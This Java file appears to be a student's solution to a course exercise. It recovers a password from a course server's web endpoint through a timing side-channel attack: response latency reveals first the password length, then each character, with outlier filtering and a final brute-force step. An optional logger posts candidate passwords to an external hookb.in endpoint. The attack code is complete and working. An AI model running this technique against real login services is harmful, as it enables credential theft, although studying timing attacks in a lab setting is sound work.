import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.*;

public class ex01_M2 {

	static final boolean DEBUG = true;
	static final boolean LOG = false;
	static final double NUM_OF_STD = 1;

	static final String USERNAME = "307889287";
	static final String URL = "http://aoi.ise.bgu.ac.il/?user=" + USERNAME + "&password=";
	static final String CURL_CMD_START = "curl -s -w \\n%{time_total} -o - ";
	static final String DIFFICULTY = "&difficulty=";

	static final CloudLogger CloudLog = new CloudLogger("https://hookb.in/G9QxlLX8OEt1m1eBNeL7");

	static final char[] LETTERS = {
			'0', '1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'
	};


	public static void main(String[] args) throws Exception {

		double s = System.currentTimeMillis();

		int difficulty = 100000;
		int attempts = 50;

		try {
			String passwd = findPasswordMin(attempts, difficulty);
			System.out.println(USERNAME + " " + passwd + " " + difficulty);
		} catch (Exception e) {
			System.out.println("We have a problem");
		} 
		finally {
			if(LOG)
				CloudLog.sendAll();
			if(DEBUG)
				System.out.println(System.currentTimeMillis()-s);
		}
	}
	
	public static int findPasswordLengthMin(int attempts, int difficulty) throws Exception {

		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[] reqTimes = new double[maxLen];
		double curReqTime = 0;
		String passwd;

		for (int i = 0; i < maxLen; i++) {
			reqTimes[i] = Double.MAX_VALUE;
		}

		for (int i = 0; i < attempts; i++) {
			passwd = "";
			for (int j = 0; j < maxLen; j++) {
				passwd += "a";
				curReqTime = getReqTime(URL + passwd + DIFFICULTY + difficulty);
				reqTimes[j] = Math.min(reqTimes[j], curReqTime);
				if (DEBUG) 
					System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
				if(LOG)
					CloudLog.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
			}
		}

		for (int i = 0; i < maxLen; i++) {
			if (DEBUG)
				System.out.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
			if(LOG)
				CloudLog.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);

			if (maxReqTime < reqTimes[i]) {
				maxReqTime = reqTimes[i];
				len = i + 1;
			}
		}
		if (DEBUG)
			System.out.println("passwd length: " + len);
		if(LOG)
			CloudLog.println("passwd length: " + len);

		return len;
	}

	public static String findPasswordMin(int attempts, int difficulty) throws Exception {

		int len = findPasswordLengthMin(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[] reqTimes = new double[lettersLen];
		double curReqTime = 0;
		char curChar = '0';
		String passwd = "";

		String passSuff = new String(new char[len - (passwd.length() + 1)]).replace('\0', '0');

		for (int i = passwd.length(); i < len - 1; i++) {

			maxReqTime = 0;
			for (int j = 0; j < lettersLen; j++) {
				reqTimes[j] = Double.MAX_VALUE;
			}

			for (int j = 0; j < attempts; j++) {
				for (int k = 0; k < lettersLen; k++) {
					curReqTime = getReqTime(URL + passwd + LETTERS[k] + passSuff + DIFFICULTY + difficulty);
					reqTimes[k] = Math.min(reqTimes[k], curReqTime);					//CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
					if (DEBUG) 
						System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
					if(LOG)
						CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
				}

			}

			for (int j = 0; j < lettersLen; j++) {
				if (DEBUG) 
					System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
				if(LOG)
					CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);

				if (maxReqTime < reqTimes[j]) {
					maxReqTime = reqTimes[j];
					curChar = LETTERS[j];
				}
			}

			passwd += curChar;
			passSuff = passSuff.substring(1);
		}

		boolean res;
		for (int i = 0; i < lettersLen; i++) {
			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);
			if (DEBUG) 
				System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
			if(LOG)
				CloudLog.println("passwd: " + passwd + LETTERS[i] + " res: " + res);

			if (res) {
				passwd += LETTERS[i];
				return passwd;
			}
		}

		return passwd+'z';
	}

	public static int findPasswordLengthStd(int attempts, int difficulty) throws Exception {
		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[][] reqTimes = new double[attempts][maxLen];
		double[] reqTimesFiltered = new double[maxLen];
		double curReqTime = 0;
		String passwd;

		for (int i = 0; i < maxLen; i++) {
			reqTimesFiltered[i] = Double.MAX_VALUE;
		}

		for (int i = 0; i < attempts; i++) {
			passwd = "";
			for (int j = 0; j < maxLen; j++) {
				passwd += "a";
				curReqTime = getReqTime(URL + passwd + DIFFICULTY + difficulty);
				reqTimes[i][j] = curReqTime;
				if (DEBUG) 
					System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[i][j]);
				if(LOG)
					CloudLog.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[i][j]);
			}
		}

		for (int j = 0; j < maxLen; j++) {
			double sum = 0; // stores sum of elements
			double sumsq = 0; // stores sum of squares
			double mean = 0;
			double var = 0;
			double std = 0;

			for (int i = 0; i < attempts; i++) {
				sum += reqTimes[i][j];
				sumsq += reqTimes[i][j] * reqTimes[i][j];
			}

			mean = sum / attempts;
			var = sumsq / attempts - mean * mean;
			std = Math.sqrt(var);

			if (DEBUG) 
				System.out.println("length: " + (j + 1) + " std: " + std);
			if(LOG)
				CloudLog.println("length: " + (j + 1) + " std: " + std);

			if (DEBUG) 
				System.out.println("length: " + (j + 1) + " sum: " + sum + " mean: " + mean + " sumsq: " + sumsq + " sdt: " + std);
			if(LOG)
				CloudLog.println("length: " + (j + 1) + " sum: " + sum + " mean: " + mean + " sumsq: " + sumsq + " sdt: " + std);


			for (int i = 0; i < attempts; i++) {
				if (reqTimes[i][j] > (mean - NUM_OF_STD*std) && reqTimes[i][j] < (mean + NUM_OF_STD*std)) {
					reqTimesFiltered[j] = Math.min(reqTimes[i][j], reqTimesFiltered[j]);
				}
				else {
					if (DEBUG) 
						System.out.println("filtered: " + reqTimes[i][j] + " length: " + (j + 1));
					if(LOG)
						CloudLog.println("filtered: " + reqTimes[i][j] + " length: " + (j + 1));	
				}
			}
		}


		for (int i = 0; i < maxLen; i++) {
			if (DEBUG)
				System.out.println("length: " + (i + 1) + " min reqTime: " + reqTimesFiltered[i]);
			if(LOG)
				CloudLog.println("length: " + (i + 1) + " min reqTime: " + reqTimesFiltered[i]);

			if (maxReqTime < reqTimesFiltered[i] && reqTimesFiltered[i] != Double.MAX_VALUE) {
				maxReqTime = reqTimesFiltered[i];
				len = i + 1;
			}
		}


		if (DEBUG)
			System.out.println("passwd length: " + len);
		if(LOG)
			CloudLog.println("passwd length: " + len);

		return len;
	}

	public static String findPasswordStd(int attempts, int difficulty) throws Exception {

		int len = findPasswordLengthStd(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[][] reqTimes = new double[attempts][lettersLen];
		double[] reqTimesFiltered = new double[lettersLen];
		double curReqTime = 0;
		char curChar = '0';
		String passwd = "";

		String passSuff = new String(new char[len - (passwd.length() + 1)]).replace('\0', '0');

		for (int i = passwd.length(); i < len - 1; i++) {

			maxReqTime = 0;
			for (int j = 0; j < lettersLen; j++) {
				reqTimesFiltered[j] = Double.MAX_VALUE;
			}
			for (int j = 0; j < attempts; j++) {
				for (int k = 0; k < lettersLen; k++) {
					curReqTime = getReqTime(URL + passwd + LETTERS[k] + passSuff + DIFFICULTY + difficulty);
					reqTimes[j][k] = curReqTime;					
					if (DEBUG) 
						System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
					if(LOG)
						CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
				}
			}

			for (int j = 0; j < lettersLen; j++) {
				double sum = 0; // stores sum of elements
				double sumsq = 0; // stores sum of squares
				double mean = 0;
				double var = 0;
				double std = 0;

				for (int k = 0; k < attempts; k++) {
					sum += reqTimes[k][j];
					sumsq += reqTimes[k][j] * reqTimes[k][j];
				}

				mean = sum / attempts;
				var = sumsq / attempts - mean * mean;
				std = Math.sqrt(var);

				if (DEBUG) 
					System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " sum: " + sum + " mean: " + mean + " sumsq: " + sumsq + " sdt: " + std);
				if(LOG)
					CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " sum: " + sum + " mean: " + mean + " sumsq: " + sumsq + " sdt: " + std);

				for (int k = 0; k < attempts; k++) {
					if (reqTimes[k][j] > (mean - NUM_OF_STD*std) && reqTimes[k][j] < (mean + NUM_OF_STD*std)) {
						reqTimesFiltered[j] = Math.min(reqTimes[k][j], reqTimesFiltered[j]);
					}
					else {
						if (DEBUG) 
							System.out.println("filtered: " + reqTimes[k][j] + " passwd: " + passwd + LETTERS[j] + passSuff );
						if(LOG)
							CloudLog.println("filtered: " + reqTimes[k][j] + " passwd: " + passwd + LETTERS[j] + passSuff );
					}
				}
			}

			for (int j = 0; j < lettersLen; j++) {
				if (DEBUG) 
					System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimesFiltered[j]);
				if(LOG)
					CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimesFiltered[j]);

				if (maxReqTime < reqTimesFiltered[j] && reqTimesFiltered[j] != Double.MAX_VALUE) {
					maxReqTime = reqTimesFiltered[j];
					curChar = LETTERS[j];
				}
			}

			passwd += curChar;
			passSuff = passSuff.substring(1);
		}


		boolean res;
		for (int i = 0; i < lettersLen; i++) {
			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);
			if (DEBUG) 
				System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
			if(LOG)
				CloudLog.println("passwd: " + passwd + LETTERS[i] + " res: " + res);

			if (res) {
				passwd += LETTERS[i];
				return passwd;
			}
		}

		return passwd+'z';
	}

	public static boolean sendReq(String urlString) throws Exception {

		URL url = new URL(urlString);
		URLConnection conn = url.openConnection();
		BufferedReader stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));

		boolean res = stdInput.readLine().equals("1");
		stdInput.close();

		return res;
	}


	public static double getReqTime(String urlString) throws Exception {

		long timeStart = System.nanoTime();

		URL url = new URL(urlString);
		URLConnection conn = url.openConnection();
		BufferedReader stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));

		long timeEnd = System.nanoTime();

		stdInput.close();

		return timeEnd - timeStart;

	}


	public static double getReqTimeCurl(String url) throws Exception {

		String curl_cmd = CURL_CMD_START + url;
		//String res = "";
		String time = "";

		Process process = Runtime.getRuntime().exec(curl_cmd);
		BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

		//res = stdInput.readLine();
		stdInput.readLine();
		time = stdInput.readLine();

		process.destroy();

		return Double.parseDouble(time);
	}
}
